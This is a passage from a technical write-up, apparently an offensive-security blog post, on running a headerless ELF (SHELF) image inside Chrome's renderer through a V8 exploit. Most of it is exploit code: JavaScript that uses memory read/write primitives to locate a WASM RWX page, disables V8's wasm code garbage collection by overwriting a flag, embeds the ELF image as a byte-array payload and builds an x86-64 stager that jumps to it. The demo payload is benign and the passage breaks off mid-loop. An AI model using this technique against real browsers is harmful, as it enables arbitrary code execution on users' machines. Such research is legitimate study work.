</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">rwx_page_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">heap_accesor</span>.<span style="color:#a6e22e">getBigUint64</span>(Number(<span style="color:#a6e22e">wasm_instance_addr</span>), <span style="color:#66d9ef">true</span>));</span></span></code></pre></div>
If we check RWX regions in GDB we will see the following:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> vmmap <span style="color:#f92672">-</span>x <span style="color:#f92672">-</span>w
</span></span><span style="display:flex;"><span>LEGEND: STACK <span style="color:#f92672">|</span> HEAP <span style="color:#f92672">|</span> CODE <span style="color:#f92672">|</span> DATA <span style="color:#f92672">|</span> RWX <span style="color:#f92672">|</span> RODATA
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x38f0a69f2000</span>     <span style="color:#ae81ff">0x38f0a71f3000</span> rwxp   <span style="color:#ae81ff">801000</span> <span style="color:#ae81ff">0</span>      [anon_38f0a69f2]
</span></span><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span></span></span></code></pre></div>
However, since we want to keep the integrity of our large RWX region, we also need to handle <a href="https://docs.google.com/document/d/14ZId5XdETWgQHJe4Jozi-aKwCwqvDLgLuokP0gnJq6Q/edit">V8&rsquo;s WASM code GC</a>.</p>
<p>Fortunately for us, there is a flag to enable or disable this feature. This flag is <code>v8::internal::FLAG_wasm_code_gc</code>. We can see it reference under <a href="https://source.chromium.org/chromium/chromium/src/+/main:v8/src/wasm/wasm-engine.cc;l=1427;drc=26887614d543aaa2b9f0a7ca240a8fc631f3ede9?q=FLAG_wasm_code_gc&amp;sq=&amp;ss=chromium%2Fchromium%2Fsrc">WasmEngine::AddPotentiallyDeadCode</a>, and if enabled it will eventually trigger a GC.</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (FLAG_wasm_code_gc) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Trigger a GC if 64kB plus 10% of committed code are potentially dead.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    size_t dead_code_limit <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>    FLAG_stress_wasm_code_gc
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">?</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">:</span> <span style="color:#ae81ff">64</span> <span style="color:#f92672">*</span> KB <span style="color:#f92672">+</span> GetWasmCodeManager()<span style="color:#f92672">-&gt;</span>committed_code_space() <span style="color:#f92672">/</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (new_potentially_dead_code_size_ <span style="color:#f92672">&gt;</span> dead_code_limit) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> inc_gc_count <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      info<span style="color:#f92672">-&gt;</span>num_code_gcs_triggered <span style="color:#f92672">&lt;</span> std<span style="color:#f92672">::</span>numeric_limits<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int8_t</span><span style="color:#f92672">&gt;::</span>max();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (current_gc_info_ <span style="color:#f92672">==</span> <span style="color:#66d9ef">nullptr</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (inc_gc_count) <span style="color:#f92672">++</span>info<span style="color:#f92672">-&gt;</span>num_code_gcs_triggered;
</span></span><span style="display:flex;"><span>    TRACE_CODE_GC(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Triggering GC (potentially dead: %zu bytes; limit: %zu bytes).</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span>        new_potentially_dead_code_size_, dead_code_limit);
</span></span><span style="display:flex;"><span>    TriggerGC(info<span style="color:#f92672">-&gt;</span>num_code_gcs_triggered);</span></span></code></pre></div>
Thankfully for us this flag is fetched dynamically by the WasmEngine on compilation of WASM module code. Therefore, we can disable this feature on runtime by overwriting the appropiate offset in Chrome:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// disabling garbage collection of wasm code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">chrome_accesor</span>.<span style="color:#a6e22e">setBigUint64</span>(<span style="color:#a6e22e">kWasmCodeGC</span>, <span style="color:#ae81ff">0</span><span style="color:#a6e22e">n</span>);</span></span></code></pre></div>
<!-- raw HTML omitted --></p>
<hr>
<h2 id="preparing-a-shelf-image">Preparing a SHELF image<a href="#preparing-a-shelf-image" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>In order to prepare our SHELF executable image, first we have to create a SHELF standalone instance. If you are interested about the internals of this process, you can check our article from <a href="https://tmpout.sh/1/10/">tmp.0ut vol 1</a>.</p>
<p>The test C code we will be deploying is the following:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> k;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">double</span> <span style="color:#a6e22e">sin</span>() ,<span style="color:#a6e22e">cos</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">float</span> A <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, B <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, i, j, z[<span style="color:#ae81ff">1760</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> b[<span style="color:#ae81ff">1760</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> arr[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">75</span>] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; ________  _________ _____ _   _ _\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">____   _   _       _   _____ &#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;|_   _|  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/  || ___ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">  _  | | | \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_   _| | | | |     | | / __  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;  | | | .  . || |_/ / | | | | | | \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| |   | | | | ___ | | `&#39; / /&#39;&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;  | | | |</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/| ||  __/| | | | | | |\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> | |   | | | |/ _ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">| |   / /  &#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;  | | | |  | || |_  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_/ / |_| \
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| | |   </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_/ / (_) | | ./ /___&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_|  |_/</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_(_)  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">__/  </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_/    </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___/ </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">___/|_| </span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">_____/&#34;</span>,
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// unobfuscated version of donut.c by Andy Sloane
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// https://www.a1k0n.net/2006/09/15/obfuscated-c-donut.html)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[2J&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>( ; ; ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(b, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">1760</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(z, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7040</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#ae81ff">6.28</span> <span style="color:#f92672">&gt;</span> j; j <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0.07</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#ae81ff">6.28</span> <span style="color:#f92672">&gt;</span> i; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0.02</span>) {
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">float</span> sini <span style="color:#f92672">=</span> <span style="color:#a6e22e">sin</span>(i),
</span></span><span style="display:flex;"><span>                      cosj <span style="color:#f92672">=</span> <span style="color:#a6e22e">cos</span>(j),
</span></span><span style="display:flex;"><span>                      sinA <span style="color:#f92672">=</span> <span style="color:#a6e22e">sin</span>(A),
</span></span><span style="display:flex;"><span>                      sinj <span style="color:#f92672">=</span> <span style="color:#a6e22e">sin</span>(j),
</span></span><span style="display:flex;"><span>                      cosA <span style="color:#f92672">=</span> <span style="color:#a6e22e">cos</span>(A),
</span></span><span style="display:flex;"><span>                      cosj2 <span style="color:#f92672">=</span> cosj <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>                      mess <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">/</span> (sini <span style="color:#f92672">*</span> cosj2 <span style="color:#f92672">*</span> sinA <span style="color:#f92672">+</span> sinj <span style="color:#f92672">*</span> cosA <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span>),
</span></span><span style="display:flex;"><span>                      cosi <span style="color:#f92672">=</span> <span style="color:#a6e22e">cos</span>(i),
</span></span><span style="display:flex;"><span>                      cosB <span style="color:#f92672">=</span> <span style="color:#a6e22e">cos</span>(B),
</span></span><span style="display:flex;"><span>                      sinB <span style="color:#f92672">=</span> <span style="color:#a6e22e">sin</span>(B),
</span></span><span style="display:flex;"><span>                      t <span style="color:#f92672">=</span> sini <span style="color:#f92672">*</span> cosj2 <span style="color:#f92672">*</span> cosA <span style="color:#f92672">-</span> sinj <span style="color:#f92672">*</span> sinA;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">*</span> mess <span style="color:#f92672">*</span> (cosi <span style="color:#f92672">*</span> cosj2 <span style="color:#f92672">*</span> cosB <span style="color:#f92672">-</span>t <span style="color:#f92672">*</span> sinB),
</span></span><span style="display:flex;"><span>                    y <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">15</span> <span style="color:#f92672">*</span> mess <span style="color:#f92672">*</span> (cosi <span style="color:#f92672">*</span> cosj2 <span style="color:#f92672">*</span> sinB <span style="color:#f92672">+</span> t <span style="color:#f92672">*</span> cosB),
</span></span><span style="display:flex;"><span>                    o <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">*</span> y,
</span></span><span style="display:flex;"><span>                    N <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> ((sinj <span style="color:#f92672">*</span> sinA <span style="color:#f92672">-</span> sini <span style="color:#f92672">*</span> cosj <span style="color:#f92672">*</span> cosA) <span style="color:#f92672">*</span> cosB <span style="color:#f92672">-</span> sini <span style="color:#f92672">*</span> cosj
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">*</span> sinA <span style="color:#f92672">-</span> sinj <span style="color:#f92672">*</span> cosA <span style="color:#f92672">-</span> cosi <span style="color:#f92672">*</span> cosj <span style="color:#f92672">*</span> sinB);
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>( <span style="color:#ae81ff">22</span> <span style="color:#f92672">&gt;</span> y <span style="color:#f92672">&amp;&amp;</span> y <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">80</span> <span style="color:#f92672">&gt;</span> x <span style="color:#f92672">&amp;&amp;</span> mess <span style="color:#f92672">&gt;</span> z[o]){
</span></span><span style="display:flex;"><span>                    z[o] <span style="color:#f92672">=</span> mess;
</span></span><span style="display:flex;"><span>                    b[o] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.,-~:;=!*#$@&#34;</span>[ N <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">?</span> N : <span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[d&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>( k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#ae81ff">1761</span> <span style="color:#f92672">&gt;</span> k; k<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">putchar</span>(k <span style="color:#f92672">%</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">?</span> b[k] <span style="color:#f92672">:</span> <span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        A <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0.04</span>;
</span></span><span style="display:flex;"><span>        B <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0.02</span>;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>(arr[i]);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Hi from SHELF!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
When we create our SHELF instance, we need to make sure to make a copy of the image before removing its Program Header Table:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc-9 donut.c -lm --static-pie -T ./static-pie.ld -o test
</span></span><span style="display:flex;"><span>cp test test_org
</span></span><span style="display:flex;"><span>python strip_headers.py ./test
</span></span><span style="display:flex;"><span>xxd -i ./test &gt;&gt; ./include/embedded.h</span></span></code></pre></div>
We need to retrieve the <code>p_filesz</code> of the  <code>PT_LOAD</code> segment of our SHELF image. This will be the size of our javascript payload:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Entry point <span style="color:#ae81ff">0x8920</span>
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">3</span> program headers, starting at offset <span style="color:#ae81ff">64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Program Headers:
</span></span><span style="display:flex;"><span>  Type           Offset             VirtAddr           PhysAddr
</span></span><span style="display:flex;"><span>                 FileSiz            MemSiz              Flags  Align
</span></span><span style="display:flex;"><span>  LOAD           <span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x0000000000000000</span> <span style="color:#ae81ff">0x0000000000000000</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">0x00000000000cb1f0</span> <span style="color:#ae81ff">0x00000000000cca80</span>  RWE    <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>  DYNAMIC        <span style="color:#ae81ff">0x00000000000c8c18</span> <span style="color:#ae81ff">0x00000000000c8c18</span> <span style="color:#ae81ff">0x00000000000c8c18</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">0x00000000000025d8</span> <span style="color:#ae81ff">0x0000000000003e40</span>  RW     <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>  TLS            <span style="color:#ae81ff">0x00000000000c5628</span> <span style="color:#ae81ff">0x00000000000c5628</span> <span style="color:#ae81ff">0x00000000000c5628</span>
</span></span><span style="display:flex;"><span>                 <span style="color:#ae81ff">0x0000000000000020</span> <span style="color:#ae81ff">0x0000000000000060</span>  RW     <span style="color:#ae81ff">0x8</span></span></span></code></pre></div>
We can create a javascript file containing the output of <code>xxd -i</code>, to then format it as a valid javascript file, also overwriting the value of the payload size with the value of <code>p_filesz</code> as previously mentioned:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">G_AT_ENTRY</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8920</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">G_AT_PHNUM</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">phdr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x07</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xb1</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  ...
</span></span><span style="display:flex;"><span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x55</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0xc0</span>,
</span></span><span style="display:flex;"><span>    ...
</span></span><span style="display:flex;"><span>]);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">payload_len</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xcb1f0</span>;</span></span></code></pre></div>
Once we have our SHELF image ready and accessible from our exploit, we have to set our SHELF image&rsquo;s stack and delta offset of our headless ELF image. These offsets correspond to the following values:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">// setting a safe address for SHELF stack
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">shelf_stack</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">stack_leak</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x80000</span><span style="color:#a6e22e">n</span>)  <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#ae81ff">0xfff</span><span style="color:#a6e22e">n</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">shelf_delta</span> <span style="color:#f92672">=</span> Number(<span style="color:#a6e22e">sizeof_Elf64_Ehdr</span> <span style="color:#f92672">+</span> (<span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">G_AT_PHNUM</span>) <span style="color:#f92672">*</span> <span style="color:#a6e22e">sizeof_Elf64_Phdr</span>));</span></span></code></pre></div>
Then we have to copy our SHELF image to our RWX region, and write a stager where the original ELF headers would have been at the beginning of our SHELF image. This stager is in charge of jumping to the SHELF entrypoint and setting the right stack address before doing so:</p>
<p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#75715e">/* [stager] :
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 b8 42 42 42 42 42 42 42 42       movabs rax,0x4242424242424242
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 89 c4                            mov rsp,rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 31 db                            xor rbx,rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 31 c9                            xor rcx,rcx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 31 d2                            xor rdx,rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 31 f6                            xor rsi,rsi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 31 ff                            xor rdi,rdi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    48 b8 41 41 41 41 41 41 41 41       movabs rax,0x4141414141414141
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    ff e0                               jmp rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stack_addr_bytes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bigint_to_array</span>(<span style="color:#a6e22e">shelf_stack</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">3</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">entry_point_bytes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bigint_to_array</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">rwx_page_addr</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">BigInt</span>(<span style="color:#a6e22e">G_AT_ENTRY</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">stager</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Uint8Array</span>([
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xB8</span>,
</span></span><span style="display:flex;"><span>    ...<span style="color:#a6e22e">stack_addr_bytes</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xc4</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xdb</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xf6</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xff</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xb8</span>,
</span></span><span style="display:flex;"><span>    ...<span style="color:#a6e22e">entry_point_bytes</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe0</span>
</span></span><span style="display:flex;"><span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">stager</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
